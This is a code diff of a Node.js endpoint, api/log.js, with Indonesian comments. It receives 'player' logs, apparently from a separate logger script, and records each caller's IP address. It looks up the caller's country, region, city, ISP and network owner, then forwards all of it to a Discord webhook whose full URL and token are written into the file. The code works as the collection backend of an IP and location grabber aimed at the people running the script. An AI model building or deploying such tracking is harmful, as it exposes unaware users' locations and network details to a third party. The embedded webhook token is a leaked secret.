@@ -1,100 +1,153 @@
 // api/log.js
 const https = require('https');
+const http = require('http');
 
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
 
-async function getGeoInfo(ip) {
+// ==========================================
+// FUNGSI AMBIL GEOLOKASI (HANYA UNTUK PLAYER LOG)
+// ==========================================
+function getGeoInfo(ip) {
     return new Promise((resolve) => {
-        const url = `https://ipwhois.io/json/${ip}`;
-        const timeout = setTimeout(() => resolve(null), 5000);
+        const url = `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,org,query`;
         
-        https.get(url, (geoRes) => {
+        const timeout = setTimeout(() => {
+            console.log(`Timeout untuk IP: ${ip}`);
+            resolve(null);
+        }, 5000);
+        
+        http.get(url, (geoRes) => {
             let data = '';
             geoRes.on('data', chunk => data += chunk);
             geoRes.on('end', () => {
                 clearTimeout(timeout);
                 try {
                     const json = JSON.parse(data);
-                    if (json && json.country) {
+                    if (json.status === 'success') {
+                        console.log(`Geo success untuk ${ip}: ${json.country}`);
                         resolve({
                             country: json.country || "N/A",
-                            region: json.region || "N/A",
+                            region: json.regionName || "N/A",
                             city: json.city || "N/A",
                             isp: json.isp || "N/A",
-                            as: json.asn || "N/A",
+                            as: json.as || "N/A",
                             org: json.org || "N/A"
                         });
                     } else {
+                        console.log(`Geo gagal untuk ${ip}: ${json.message || 'unknown'}`);
                         resolve(null);
                     }
                 } catch (e) {
+                    console.log(`Parse error untuk ${ip}: ${e.message}`);
                     resolve(null);
                 }
             });
-        }).on('error', () => resolve(null));
+        }).on('error', (err) => {
+            clearTimeout(timeout);
+            console.log(`Request error untuk ${ip}: ${err.message}`);
+            resolve(null);
+        });
     });
 }
 
+// ==========================================
+// FUNGSI KIRIM EMBED KE DISCORD
+// ==========================================
+async function sendToDiscord(embed) {
+    const payload = JSON.stringify({ embeds: [embed] });
+    const url = new URL(DISCORD_WEBHOOK);
+    const options = {
+        hostname: url.hostname,
+        path: url.pathname,
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' }
+    };
+    
+    return new Promise((resolve) => {
+        const req = https.request(options, (res) => {
+            res.resume();
+            resolve(res.statusCode === 204 || res.statusCode === 200);
+        });
+        req.on('error', () => resolve(false));
+        req.write(payload);
+        req.end();
+    });
+}
+
+// ==========================================
+// HANDLER UTAMA
+// ==========================================
 module.exports = async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
     
     if (req.method !== 'POST') {
-        return res.status(405).json({ Ndraawz: 'Not Allowed' });
+        return res.status(405).json({ error: 'Method Not Allowed' });
     }
 
+    // Baca body
     let body = '';
     await new Promise((resolve) => {
         req.on('data', chunk => body += chunk);
         req.on('end', resolve);
     });
 
+    // Ambil IP dari header request
     const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
     const cleanIp = clientIp.replace('::ffff:', '');
+    console.log(`[LOG] Received from IP: ${cleanIp}`);
 
     try {
         const data = JSON.parse(body);
         
-        // Kalau dari testing.js (security log)
+        // ==========================================
+        // TYPE: SECURITY LOG (dari testing.js)
+        // ==========================================
         if (data.type === "security") {
+            console.log(`[LOG] Security log: ${data.securityType} for IP: ${data.ip || cleanIp}`);
+            
             const embed = {
                 title: "❗️ Ndraawz Security ❗️",
                 description: data.message,
                 color: 0xff0000,
+                footer: { text: "Security System | IP: " + (data.ip || cleanIp) },
                 timestamp: new Date().toISOString()
             };
-            const payload = JSON.stringify({ embeds: [embed] });
-            const url = new URL(DISCORD_WEBHOOK);
-            const options = {
-                hostname: url.hostname,
-                path: url.pathname,
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' }
-            };
-            const discordReq = https.request(options, (discordRes) => {
-                discordRes.resume();
-                res.status(200).json({ ok: true });
-            });
-            discordReq.on('error', () => res.status(200).json({ ok: false }));
-            discordReq.write(payload);
-            discordReq.end();
-            return;
+            
+            await sendToDiscord(embed);
+            console.log(`✅ Security log terkirim`);
+            return res.status(200).json({ ok: true });
         }
         
-        // Kalau dari logger script (player log)
+        // ==========================================
+        // TYPE: PLAYER LOG (dari logger script)
+        // ==========================================
         if (data.type === "player" && data.fields) {
-            const geoData = await getGeoInfo(cleanIp) || {
-                country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A"
-            };
+            console.log(`[LOG] Player log, fields count: ${data.fields.length}`);
             
+            // Ambil geolokasi dari IP
+            let geoData = await getGeoInfo(cleanIp);
+            
+            // Siapkan fields untuk embed
             const allFields = [
                 ...(data.fields || []),
                 { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
-                { name: "📡 IP Address", value: cleanIp, inline: false },
-                { name: "🚩 Country", value: geoData.country, inline: false },
-                { name: "📍 Region", value: geoData.region, inline: false },
-                { name: "🏙️ City", value: geoData.city, inline: false },
-                { name: "🏢 ISP", value: geoData.isp, inline: false }
+                { name: "📡 IP Address", value: cleanIp, inline: false }
             ];
+            
+            // Tambahkan info geolokasi jika berhasil
+            if (geoData) {
+                allFields.push(
+                    { name: "🚩 Country", value: geoData.country, inline: false },
+                    { name: "📍 Region", value: geoData.region, inline: false },
+                    { name: "🏙️ City", value: geoData.city, inline: false },
+                    { name: "🏢 ISP", value: geoData.isp, inline: false },
+                    { name: "📡 AS / Org", value: `${geoData.as} / ${geoData.org}`, inline: false }
+                );
+            } else {
+                allFields.push(
+                    { name: "⚠️ Info", value: "Geolokasi gagal diambil", inline: false }
+                );
+            }
             
             const embed = {
                 title: "🚀 Ndraawz Logger",
@@ -103,39 +156,37 @@ module.exports = async function handler(req, res) {
                 timestamp: new Date().toISOString()
             };
             
-            const payload = JSON.stringify({ embeds: [embed] });
-            const url = new URL(DISCORD_WEBHOOK);
-            const options = {
-                hostname: url.hostname,
-                path: url.pathname,
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' }
-            };
-            const discordReq = https.request(options, (discordRes) => {
-                discordRes.resume();
-                res.status(200).json({ ok: true });
-            });
-            discordReq.on('error', () => res.status(200).json({ ok: false }));
-            discordReq.write(payload);
-            discordReq.end();
-            return;
+            await sendToDiscord(embed);
+            console.log(`✅ Player log terkirim untuk IP: ${cleanIp}`);
+            return res.status(200).json({ ok: true });
         }
         
-        // Fallback untuk format lama (tanpa type)
+        // ==========================================
+        // FALLBACK: format lama (tanpa type)
+        // ==========================================
         if (data.fields) {
-            const geoData = await getGeoInfo(cleanIp) || {
-                country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A"
-            };
+            console.log(`[LOG] Fallback log, fields count: ${data.fields.length}`);
+            
+            let geoData = await getGeoInfo(cleanIp);
             
             const allFields = [
                 ...(data.fields || []),
                 { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
-                { name: "📡 IP Address", value: cleanIp, inline: false },
-                { name: "🚩 Country", value: geoData.country, inline: false },
-                { name: "📍 Region", value: geoData.region, inline: false },
-                { name: "🏙️ City", value: geoData.city, inline: false },
-                { name: "🏢 ISP", value: geoData.isp, inline: false }
+                { name: "📡 IP Address", value: cleanIp, inline: false }
             ];
+            
+            if (geoData) {
+                allFields.push(
+                    { name: "🚩 Country", value: geoData.country, inline: false },
+                    { name: "📍 Region", value: geoData.region, inline: false },
+                    { name: "🏙️ City", value: geoData.city, inline: false },
+                    { name: "🏢 ISP", value: geoData.isp, inline: false }
+                );
+            } else {
+                allFields.push(
+                    { name: "⚠️ Info", value: "Geolokasi gagal diambil", inline: false }
+                );
+            }
             
             const embed = {
                 title: "🚀 Ndraawz Logger",
@@ -144,27 +195,15 @@ module.exports = async function handler(req, res) {
                 timestamp: new Date().toISOString()
             };
             
-            const payload = JSON.stringify({ embeds: [embed] });
-            const url = new URL(DISCORD_WEBHOOK);
-            const options = {
-                hostname: url.hostname,
-                path: url.pathname,
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' }
-            };
-            const discordReq = https.request(options, (discordRes) => {
-                discordRes.resume();
-                res.status(200).json({ ok: true });
-            });
-            discordReq.on('error', () => res.status(200).json({ ok: false }));
-            discordReq.write(payload);
-            discordReq.end();
-            return;
+            await sendToDiscord(embed);
+            console.log(`✅ Fallback log terkirim untuk IP: ${cleanIp}`);
+            return res.status(200).json({ ok: true });
         }
         
-        res.status(400).json({ error: "Invalid request format" });
+        return res.status(400).json({ error: "Invalid request format" });
         
     } catch (err) {
-        res.status(400).json({ error: err.message });
+        console.error(`[LOG] Parse error: ${err.message}`);
+        res.status(400).json({ error: 'Invalid JSON' });
     }
 };
